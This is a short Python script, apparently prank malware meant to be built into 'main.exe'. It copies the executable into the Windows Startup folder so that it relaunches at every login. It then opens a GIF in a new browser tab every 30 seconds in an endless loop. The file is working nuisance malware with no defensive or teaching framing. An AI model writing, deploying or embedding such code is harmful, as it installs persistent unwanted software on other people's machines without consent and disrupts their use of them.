import webbrowser
import time
import os
import shutil
import getpass

url = "https://c.tenor.com/1BKoFdGS6MMAAAAd/tenor.gif"

startup_path = os.path.join("C:\\Users", getpass.getuser(), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
shutil.copy(os.path.join(os.path.dirname(os.path.abspath(__file__)), "main.exe"), os.path.join(startup_path, "main.exe"))


while True:
    
    
    webbrowser.open_new_tab(url)

    time.sleep(30)

